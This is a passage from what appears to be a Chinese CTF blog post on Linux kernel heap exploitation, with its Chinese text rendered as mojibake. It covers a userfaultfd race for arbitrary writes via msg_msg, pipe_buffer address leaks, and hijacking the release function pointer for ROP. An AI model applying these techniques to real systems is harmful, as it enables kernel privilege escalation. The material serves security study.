æˆ– FUSE å®Œæˆ race condition writeï¼‰"></a>ä»»æ„åœ°å€å†™ï¼ˆç»“åˆ userfaultfd æˆ– FUSE å®Œæˆ race condition writeï¼‰</h3><p>å½“æˆ‘ä»¬è°ƒç”¨ msgsnd ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå…¶ä¼šè°ƒç”¨ <code>load_msg()</code> å°†ç”¨æˆ·ç©ºé—´æ•°æ®æ‹·è´åˆ°å†…æ ¸ç©ºé—´ä¸­ï¼Œé¦–å…ˆæ˜¯è°ƒç”¨ <code>alloc_msg()</code> åˆ†é… <code>msg_msg</code> å•å‘é“¾è¡¨ï¼Œä¹‹åæ‰æ˜¯æ­£å¼çš„æ‹·è´è¿‡ç¨‹ï¼Œå³ç©ºé—´çš„åˆ†é…ä¸æ•°æ®çš„æ‹·è´æ˜¯åˆ†å¼€è¿›è¡Œçš„</p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œ<strong>åœ¨æ‹·è´æ—¶åˆ©ç”¨ userfaultfd å°†æ‹·è´åœä¸‹æ¥ï¼Œåœ¨å­è¿›ç¨‹ä¸­ç¯¡æ”¹ msg_msg çš„ next æŒ‡é’ˆï¼Œåœ¨æ¢å¤æ‹·è´ä¹‹åä¾¿ä¼šå‘æˆ‘ä»¬ç¯¡æ”¹åçš„ç›®æ ‡åœ°å€ä¸Šå†™å…¥æ•°æ®ï¼Œä»è€Œå®ç°ä»»æ„åœ°å€å†™</strong></p><p>è¿™é‡Œå€Ÿç”¨ä¸€å¼  bsauce å¸ˆå‚…çš„å›¾æ¥ä½œä¸ºğŸŒ°è¯´æ˜ï¼Œå›¾ä¸Šæ˜¯å°† next æŒ‡é’ˆåŠ«æŒåˆ°è¿›ç¨‹çš„ PCB ä¸Šä»è€Œä¿®æ”¹ cred æŒ‡é’ˆ</p><p><img src="https://s2.loli.net/2022/03/09/p7d1PGVaM6TzmLc.png" alt="æ¥è‡ª bsauce æŠ•ç¨¿å®‰å…¨å®¢çš„æ–‡ç« çš„å›¾ç‰‡"></p><p>ï¼ˆä¾‹é¢˜ï¼šcorCTF2021 - Fire of Salvationï¼‰</p><blockquote><p>ç¬”è€…è¿˜æ²¡å†™ wpï¼Œè¿™é‡Œå…ˆğŸ•³ç€â€¦</p></blockquote><h1 id="0x08-pipe-ç®¡é“ç›¸å…³"><a href="#0x08-pipe-ç®¡é“ç›¸å…³" class="headerlink" title="0x08.pipe ç®¡é“ç›¸å…³"></a>0x08.pipe ç®¡é“ç›¸å…³</h1><p><strong>ç®¡é“</strong>åŒæ ·æ˜¯å†…æ ¸ä¸­ååˆ†é‡è¦ä¹Ÿååˆ†å¸¸ç”¨çš„ä¸€ä¸ª IPC å·¥å…·ï¼ŒåŒæ ·åœ°ç®¡é“çš„ç»“æ„ä¹Ÿèƒ½å¤Ÿåœ¨å†…æ ¸åˆ©ç”¨ä¸­ä¸ºæˆ‘ä»¬æ‰€ç”¨ï¼Œå…¶æœ¬è´¨ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ª virtual inode ä¸ä¸¤ä¸ªå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦æ„æˆçš„ï¼š</p><p><img src="https://s2.loli.net/2022/03/09/yTX7aREhPwsJIbM.png" alt="éå¸¸ç»å…¸çš„ä¸€å¼ å›¾"></p><h2 id="pipe-inode-infoï¼ˆkmalloc-192-GFP-KERNEL-ACCOUNTï¼‰ï¼šç®¡é“æœ¬ä½“"><a href="#pipe-inode-infoï¼ˆkmalloc-192-GFP-KERNEL-ACCOUNTï¼‰ï¼šç®¡é“æœ¬ä½“" class="headerlink" title="pipe_inode_infoï¼ˆkmalloc-192|GFP_KERNEL_ACCOUNTï¼‰ï¼šç®¡é“æœ¬ä½“"></a>pipe_inode_infoï¼ˆkmalloc-192|GFP_KERNEL_ACCOUNTï¼‰ï¼šç®¡é“æœ¬ä½“</h2><p>åœ¨å†…æ ¸ä¸­ï¼Œç®¡é“æœ¬è´¨ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ª<strong>è™šæ‹Ÿçš„ inode</strong> æ¥è¡¨ç¤ºçš„ï¼Œå¯¹åº”çš„å°±æ˜¯ä¸€ä¸ª <code>pipe_inode_info</code> ç»“æ„ä½“ï¼ˆ<code>inode-&gt;i_pipe</code>ï¼‰ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ªç®¡é“çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œå†…æ ¸ä¼šåˆ›å»ºä¸€ä¸ª VFS inode ä¸ä¸€ä¸ª pipe_inode_info ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æ³„éœ²-4"><a href="#æ•°æ®æ³„éœ²-4" class="headerlink" title="æ•°æ®æ³„éœ²"></a>æ•°æ®æ³„éœ²</h3><h4 id="å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ-direct-mapping-areaï¼‰-3"><a href="#å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ-direct-mapping-areaï¼‰-3" class="headerlink" title="*å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ direct mapping areaï¼‰"></a><em>*å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ direct mapping areaï¼‰</em></h4><p><code>pipe_inode_info-&gt;bufs</code> ä¸ºä¸€ä¸ªåŠ¨æ€åˆ†é…çš„ç»“æ„ä½“æ•°ç»„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»–æ¥æ³„éœ²å‡ºå†…æ ¸çš„â€œå †â€ä¸Šåœ°å€</p><h2 id="pipe-bufferï¼ˆkmalloc-1k-GFP-KERNEL-ACCOUNTï¼‰ï¼šç®¡é“æ•°æ®"><a href="#pipe-bufferï¼ˆkmalloc-1k-GFP-KERNEL-ACCOUNTï¼‰ï¼šç®¡é“æ•°æ®" class="headerlink" title="pipe_bufferï¼ˆkmalloc-1k|GFP_KERNEL_ACCOUNTï¼‰ï¼šç®¡é“æ•°æ®"></a>pipe_bufferï¼ˆkmalloc-1k|GFP_KERNEL_ACCOUNTï¼‰ï¼šç®¡é“æ•°æ®</h2><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ä¸­å–å‡ºä¸€ä¸ª object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="åˆ†é…ï¼špipe-ç³»ç»Ÿè°ƒç”¨æ—"><a href="#åˆ†é…ï¼špipe-ç³»ç»Ÿè°ƒç”¨æ—" class="headerlink" title="åˆ†é…ï¼špipe ç³»ç»Ÿè°ƒç”¨æ—"></a>åˆ†é…ï¼špipe ç³»ç»Ÿè°ƒç”¨æ—</h3><p>åˆ›å»ºç®¡é“ä½¿ç”¨çš„è‡ªç„¶æ˜¯ pipe ä¸ pipe2 è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå…¶æœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ° <code>do_pipe2()</code> è¿™ä¸ªå‡½æ•°ï¼Œä¸åŒçš„æ˜¯åè€…æˆ‘ä»¬å¯ä»¥æŒ‡å®šä¸€ä¸ª flagï¼Œè€Œå‰è€…é»˜è®¤ flag ä¸º 0</p><p>å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">__do_pipe_flags()</span><br><span class="line">create_pipe_files()</span><br><span class="line">get_pipe_inode()</span><br><span class="line">alloc_pipe_info()</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè°ƒç”¨ <code>kcalloc()</code> åˆ†é…ä¸€ä¸ª <code>pipe_buffer</code> æ•°ç»„ï¼Œé»˜è®¤æ•°é‡ä¸º <code>PIPE_DEF_BUFFERS</code> ï¼ˆ16ï¼‰ä¸ªï¼Œå› æ­¤ä¼šç›´æ¥ä» kmalloc-1k ä¸­æ‹¿ objectï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">pipe = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br></pre></td></tr></table></figure><h3 id="é‡Šæ”¾ï¼šclose-ç³»ç»Ÿè°ƒç”¨"><a href="#é‡Šæ”¾ï¼šclose-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="é‡Šæ”¾ï¼šclose ç³»ç»Ÿè°ƒç”¨"></a>é‡Šæ”¾ï¼šclose ç³»ç»Ÿè°ƒç”¨</h3><p>å½“æˆ‘ä»¬å…³é—­ä¸€ä¸ªç®¡é“çš„ä¸¤ç«¯ä¹‹åï¼Œå¯¹åº”çš„ç®¡é“å°±ä¼šè¢«é‡Šæ”¾æ‰ï¼Œç›¸åº”åœ°ï¼Œ<code>pipe_buffer</code> æ•°ç»„ä¹Ÿä¼šè¢«é‡Šæ”¾æ‰</p><p>å¯¹äºç®¡é“å¯¹åº”çš„æ–‡ä»¶ï¼Œå…¶ <code>file_operations</code> è¢«è®¾ä¸º <code>pipefifo_fops</code> ï¼Œå…¶ä¸­ release å‡½æ•°æŒ‡é’ˆè®¾ä¸º <code>pipe_release</code> å‡½æ•°ï¼Œå› æ­¤åœ¨å…³é—­ç®¡é“æ–‡ä»¶æ—¶æœ‰å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()</span><br><span class="line">    put_pipe_info()</span><br></pre></td></tr></table></figure><p>åœ¨ <code>put_pipe_info()</code> ä¸­ä¼šå°†ç®¡é“å¯¹åº”çš„æ–‡ä»¶è®¡æ•°å‡ä¸€ï¼Œç®¡é“ä¸¤ç«¯éƒ½å…³é—­ä¹‹åæœ€ç»ˆä¼šèµ°åˆ° <code>free_pipe_info()</code> ä¸­ï¼Œåœ¨è¯¥å‡½æ•°ä¸­é‡Šæ”¾æ‰ç®¡é“æœ¬ä½“ä¸ buffer æ•°ç»„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free_pipe_info</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">watch_queue_clear(pipe-&gt;watch_queue);</span><br><span class="line">put_watch_queue(pipe-&gt;watch_queue);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>) account_pipe_buffers(pipe-&gt;user, pipe-&gt;nr_accounted, <span class="number">0</span>);</span><br><span class="line">free_uid(pipe-&gt;user);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line"><span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">pipe_buf_release(pipe, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;tmp_page)</span><br><span class="line">__free_page(pipe-&gt;tmp_page);</span><br><span class="line">kfree(pipe-&gt;bufs);</span><br><span class="line">kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æ³„éœ²-5"><a href="#æ•°æ®æ³„éœ²-5" class="headerlink" title="æ•°æ®æ³„éœ²"></a>æ•°æ®æ³„éœ²</h3><h4 id="å†…æ ¸-text-æ®µåœ°å€-3"><a href="#å†…æ ¸-text-æ®µåœ°å€-3" class="headerlink" title="å†…æ ¸ .text æ®µåœ°å€"></a>å†…æ ¸ .text æ®µåœ°å€</h4><p><code>pipe_buffer-&gt;pipe_buf_operations</code> é€šå¸¸æŒ‡å‘ä¸€å¼ å…¨å±€å‡½æ•°è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥å‡½æ•°è¡¨çš„åœ°å€æ³„éœ²å‡ºå†…æ ¸ .text æ®µåŸºå€</p><h3 id="åŠ«æŒå†…æ ¸æ‰§è¡Œæµ-2"><a href="#åŠ«æŒå†…æ ¸æ‰§è¡Œæµ-2" class="headerlink" title="åŠ«æŒå†…æ ¸æ‰§è¡Œæµ"></a>åŠ«æŒå†…æ ¸æ‰§è¡Œæµ</h3><p>å½“æˆ‘ä»¬å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œä¼šè§¦å‘ <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> è¿™ä¸€æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment"> * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment"> * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment"> * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment"> * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment"> * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment"> * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment"> * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment"> * cache.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()</span><br><span class="line">    put_pipe_info()</span><br><span class="line">        free_pipe_info()</span><br><span class="line">            pipe_buf_release()</span><br><span class="line">                pipe_buffer-&gt;pipe_buf_operations-&gt;release() // it should be anon_pipe_buf_release()</span><br></pre></td></tr></table></figure><p>åœ¨ <code>pipe_buf_release()</code> ä¸­ä¼šè°ƒç”¨åˆ°è¯¥ <code>pipe_buffer</code> çš„å‡½æ•°è¡¨ä¸­çš„ release æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pipe_buf_release - put a reference to a pipe_buffer</span></span><br><span class="line"><span class="comment"> * @pipe:the pipe that the buffer belongs to</span></span><br><span class="line"><span class="comment"> * @buf:the buffer to put a reference to</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">pipe_buf_release</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> pipe_buffer *buf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span> =</span> buf-&gt;ops;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">ops-&gt;release(pipe, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦åŠ«æŒå…¶å‡½æ•°è¡¨åˆ°å¯æ§åŒºåŸŸåå†å…³é—­ç®¡é“çš„ä¸¤ç«¯ä¾¿èƒ½åŠ«æŒå†…æ ¸æ‰§è¡Œæµ</p><p>ç»è¿‡ç¬”è€…å®æµ‹ï¼ˆå…¶å®ä»æºç ä¸Šä¾¿èƒ½çœ‹å‡ºï¼‰ï¼Œå½“æ‰§è¡Œåˆ°è¯¥æŒ‡é’ˆæ—¶ rsi å¯„å­˜å™¨åˆšå¥½æŒ‡å‘å¯¹åº”çš„ <code>pipe_buffer</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†å‡½æ•°è¡¨åŠ«æŒåˆ° <code>pipe_buffer</code> ä¸Šï¼Œæ‰¾åˆ°ä¸€æ¡åˆé€‚çš„ gadget å°†æ ˆè¿ç§»åˆ°è¯¥å¤„ï¼Œä»è€Œæ›´é¡ºåˆ©åœ°å®Œæˆ ROP</p><p><img src="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png" alt="image.png"></p><p>ï¼ˆä¾‹é¢˜ï¼š<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">D^3CTF2022 - d3kheap</a>ï¼‰</p><blockquote><p>ä¹‹å‰ä¾‹é¢˜æœ¬æ¥æƒ³é€‰ä¸€ä¸ªä»¥å‰æœ‰çš„ CTF é¢˜æ¥å†™çš„ï¼Œä½†æ˜¯<strong>ç¬”è€…å¤ªæ‡’äº†</strong>â€¦äºæ˜¯ä¸€ç›´æ‹–åˆ°æœ€è¿‘åˆšå¥½æ‹¿è¿™ä¸ªç»“æ„ä½“å‡ºäº†ä¸€é“ CTF é¢˜ï¼Œæ‰€ä»¥å°±é¡ºä¾¿æŠŠè¿™ä¸ªè¿‡å»å¼€çš„å‘ç»™è¡¥å……ä¸Šâ€¦</p></blockquote><h1 id="0x09-sk-buffï¼šå†…æ ¸ä¸­çš„â€œå¤§å¯¹è±¡èœå•å †â€"><a href="#0x09-sk-buffï¼šå†…æ ¸ä¸­çš„â€œå¤§å¯¹è±¡èœå•å †â€" class="headerlink" title="0x09.sk_buffï¼šå†…æ ¸ä¸­çš„â€œå¤§å¯¹è±¡èœå•å †â€"></a>0x09.sk_buffï¼šå†…æ ¸ä¸­çš„â€œå¤§å¯¹è±¡èœå•å †â€</h1><p>è¯´åˆ° Linux kernel çš„ç½‘ç»œåè®®æ ˆï¼Œæˆ‘ä»¬æ¯«æ— ç–‘é—®æ— æ³•ç»•å¼€ 